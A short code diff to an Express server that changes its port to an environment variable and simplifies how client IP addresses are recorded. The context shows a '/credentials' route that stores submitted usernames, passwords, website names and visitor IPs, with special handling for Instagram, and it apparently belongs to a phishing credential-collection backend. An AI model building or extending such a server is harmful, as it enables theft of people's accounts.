@@ -11,7 +11,7 @@ const __dirname = path.dirname(__filename);
 console.log(__dirname);
 
 const app = express();
-const PORT = 5467;
+const PORT = process.env.PORT;
 
 app.use(cors());
 app.set("trust proxy", true);
@@ -46,7 +46,7 @@ app.post("/credentials", async (req, res) => {
     username,
     password,
     website,
-    ipaddress: req.socket.remoteAddress || req.ip,
+    ipaddress: req.ip,
   });
 
   if (website == "Instagram") {
